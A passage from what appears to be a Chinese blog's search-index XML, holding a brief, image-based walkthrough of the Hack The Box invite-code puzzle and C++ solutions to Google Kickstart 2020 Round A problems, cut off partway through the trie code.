          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AtCoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box 邀请码获取</title>
      <link href="/2020/03/24/Hack-The-Box-%E9%82%80%E8%AF%B7%E7%A0%81%E8%8E%B7%E5%8F%96/"/>
      <url>/2020/03/24/Hack-The-Box-%E9%82%80%E8%AF%B7%E7%A0%81%E8%8E%B7%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>学长发了一个链接，点进去看了一下好像有点意思。正好之前单推vtuber（DD）的时候学了点相关知识。就玩一下。</p><p>url : <a href="https://www.hackthebox.eu/invite">https://www.hackthebox.eu/invite</a></p><h1 id="2-过程"><a href="#2-过程" class="headerlink" title="2. 过程"></a>2. 过程</h1><h2 id="1-碰到网页，先检查一下。发现一个api，挺显眼就点进去康康。"><a href="#1-碰到网页，先检查一下。发现一个api，挺显眼就点进去康康。" class="headerlink" title="(1)  碰到网页，先检查一下。发现一个api，挺显眼就点进去康康。"></a>(1)  碰到网页，先检查一下。发现一个api，挺显眼就点进去康康。</h2><p><img src="1.png" alt=""></p><h2 id="2-进入网站之后发现一个函数，在控制台命令里面试一下"><a href="#2-进入网站之后发现一个函数，在控制台命令里面试一下" class="headerlink" title="(2) 进入网站之后发现一个函数，在控制台命令里面试一下"></a>(2) 进入网站之后发现一个函数，在控制台命令里面试一下</h2><p><img src="2.png" alt=""></p><h2 id="3-试一下果然试出了端倪"><a href="#3-试一下果然试出了端倪" class="headerlink" title="(3)试一下果然试出了端倪"></a>(3)试一下果然试出了端倪</h2><p><img src="3.png" alt=""></p><h2 id="4-发现是构建post请求的，那直接用curl"><a href="#4-发现是构建post请求的，那直接用curl" class="headerlink" title="(4)发现是构建post请求的，那直接用curl"></a>(4)发现是构建post请求的，那直接用curl</h2><p><img src="4.png" alt=""></p><h2 id="5-发现base64解码，这里我多试了一下发现有其他解码方式"><a href="#5-发现base64解码，这里我多试了一下发现有其他解码方式" class="headerlink" title="(5) 发现base64解码，这里我多试了一下发现有其他解码方式"></a>(5) 发现base64解码，这里我多试了一下发现有其他解码方式</h2><p><img src="5.png" alt="image"></p><h2 id="6-解码完成之后发现是这个"><a href="#6-解码完成之后发现是这个" class="headerlink" title="(6) 解码完成之后发现是这个"></a>(6) 解码完成之后发现是这个</h2><p><img src="6.png" alt=""></p><h2 id="7-那就再构建一次post"><a href="#7-那就再构建一次post" class="headerlink" title="(7) 那就再构建一次post"></a>(7) 那就再构建一次post</h2><p><img src="7.png" alt=""></p><h2 id="8-那就再解码一次，这次终于找到了"><a href="#8-那就再解码一次，这次终于找到了" class="headerlink" title="(8) 那就再解码一次，这次终于找到了"></a>(8) 那就再解码一次，这次终于找到了</h2><p><img src="8.png" alt=""></p><h1 id="3-心得"><a href="#3-心得" class="headerlink" title="3. 心得"></a>3. 心得</h1><p>寻找线索的时候要冷静。 /狗头</p><p><img src="9.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Kickstart 2020 Round A</title>
      <link href="/2020/03/22/Google-Kickstart-2020-Round-A/"/>
      <url>/2020/03/22/Google-Kickstart-2020-Round-A/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="A-Allocation"><a href="#A-Allocation" class="headerlink" title="A. Allocation"></a>A. Allocation</h1><h2 id="题意：-给定N，M，和N个数。求最多数量的数字，且这些数字之和不超过M。"><a href="#题意：-给定N，M，和N个数。求最多数量的数字，且这些数字之和不超过M。" class="headerlink" title="题意： 给定N，M，和N个数。求最多数量的数字，且这些数字之和不超过M。"></a>题意： 给定N，M，和N个数。求最多数量的数字，且这些数字之和不超过M。</h2><h2 id="题解：-排序，贪心。"><a href="#题解：-排序，贪心。" class="headerlink" title="题解： 排序，贪心。"></a>题解： 排序，贪心。</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">5e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7ffffff</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token keyword">int</span> T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> N<span class="token punctuation">,</span> x<span class="token punctuation">,</span> B<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N <span class="token operator">>></span> B<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> vec<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> x<span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>vec<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>B<span class="token operator">-</span>vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span>            ans<span class="token operator">++</span><span class="token punctuation">,</span> B <span class="token operator">-=</span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Case #"</span> <span class="token operator">&lt;&lt;</span> T <span class="token operator">&lt;&lt;</span> <span class="token string">": "</span> <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out","w",stdout);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">//cin >> T;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> T<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="B-Plates"><a href="#B-Plates" class="headerlink" title="B. Plates"></a>B. Plates</h1><h2 id="题意-n个栈，每个栈中有k个个元素，让你取p个元素，使得和最大"><a href="#题意-n个栈，每个栈中有k个个元素，让你取p个元素，使得和最大" class="headerlink" title="题意: n个栈，每个栈中有k个个元素，让你取p个元素，使得和最大"></a>题意: n个栈，每个栈中有k个个元素，让你取p个元素，使得和最大</h2><h2 id="题解：-维护n个栈前缀和，记忆化搜索"><a href="#题解：-维护n个栈前缀和，记忆化搜索" class="headerlink" title="题解： 维护n个栈前缀和，记忆化搜索"></a>题解： 维护n个栈前缀和，记忆化搜索</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">1600</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> N<span class="token punctuation">,</span> P<span class="token punctuation">,</span> K<span class="token punctuation">;</span><span class="token keyword">int</span> prefix<span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> record<span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> mem<span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//mem[x][y] 表示第x个栈之前已经选择了y个数</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>y <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> y <span class="token operator">></span> P <span class="token operator">||</span> x <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>mem<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> mem<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token function">min</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> K<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        mem<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token function">dfs</span><span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> prefix<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> mem<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> mem<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token keyword">int</span> T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> N <span class="token operator">>></span> K <span class="token operator">>></span> P<span class="token punctuation">;</span>    <span class="token function">clr</span><span class="token punctuation">(</span>prefix<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">clr</span><span class="token punctuation">(</span>mem<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> K<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cin <span class="token operator">>></span> record<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            prefix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> prefix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> record<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Case #"</span> <span class="token operator">&lt;&lt;</span> T <span class="token operator">&lt;&lt;</span> <span class="token string">": "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">dfs</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span> P<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out","w",stdout);</span>    <span class="token comment">//freopen("in", "r", stdin);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token comment">// cin >> T;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> T<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="C-Workout"><a href="#C-Workout" class="headerlink" title="C. Workout"></a>C. Workout</h1><h2 id="题意-给定N，K，N个数，N个数字中插入K个数，保持严格递增，求两两数字之间的差值最大的最小值。"><a href="#题意-给定N，K，N个数，N个数字中插入K个数，保持严格递增，求两两数字之间的差值最大的最小值。" class="headerlink" title="题意: 给定N，K，N个数，N个数字中插入K个数，保持严格递增，求两两数字之间的差值最大的最小值。"></a>题意: 给定N，K，N个数，N个数字中插入K个数，保持严格递增，求两两数字之间的差值最大的最小值。</h2><h2 id="题解：二分插值答案"><a href="#题解：二分插值答案" class="headerlink" title="题解：二分插值答案"></a>题解：二分插值答案</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">2e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7ffffff</span><span class="token punctuation">;</span><span class="token keyword">int</span> M<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> N<span class="token punctuation">,</span> K<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> vec<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">judge</span><span class="token punctuation">(</span><span class="token keyword">int</span> d<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>vec<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">%</span>d<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>            cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> d<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cnt<span class="token operator">></span>K<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token keyword">int</span> T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span>  dmax <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    vec<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> N <span class="token operator">>></span> K<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> M<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        vec<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>M<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> M<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dmax <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dmax<span class="token punctuation">,</span> M<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> M<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> r <span class="token operator">=</span> dmax<span class="token punctuation">,</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> mid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>l<span class="token operator">&lt;=</span>r<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">judge</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> mid<span class="token punctuation">,</span> r <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Case #"</span> <span class="token operator">&lt;&lt;</span> T <span class="token operator">&lt;&lt;</span> <span class="token string">": "</span> <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out","w",stdout);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> T<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> T<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="D-Bundling"><a href="#D-Bundling" class="headerlink" title="D. Bundling"></a>D. Bundling</h1><h2 id="题意：给定N，K，N个字符串，N个字符串可以分成-N-K-组，然后定一个值-ans-所有租的前缀相同的字母的和，求这个值的最大值是多少。"><a href="#题意：给定N，K，N个字符串，N个字符串可以分成-N-K-组，然后定一个值-ans-所有租的前缀相同的字母的和，求这个值的最大值是多少。" class="headerlink" title="题意：给定N，K，N个字符串，N个字符串可以分成$ N /K$ 组，然后定一个值$ans=$ 所有租的前缀相同的字母的和，求这个值的最大值是多少。"></a>题意：给定N，K，N个字符串，N个字符串可以分成$ N /K$ 组，然后定一个值$ans=$ 所有租的前缀相同的字母的和，求这个值的最大值是多少。</h2><h2 id="题解：trie-计数-google-编译器无法通过"><a href="#题解：trie-计数-google-编译器无法通过" class="headerlink" title="题解：trie  计数.(google 编译器无法通过)"></a>题解：trie  计数.(google 编译器无法通过)</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">1e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7ffffff</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Trie</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> next<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ed<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> par<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> dep<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> L<span class="token punctuation">,</span> root<span class="token punctuation">;</span>    <span class="token keyword">int</span> ans<span class="token punctuation">;</span>    <span class="token keyword">int</span> N<span class="token punctuation">,</span> K<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            next<span class="token punctuation">[</span>L<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        ed<span class="token punctuation">[</span>L<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> L<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans <span class="token operator">=</span> L <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        root <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> now <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span 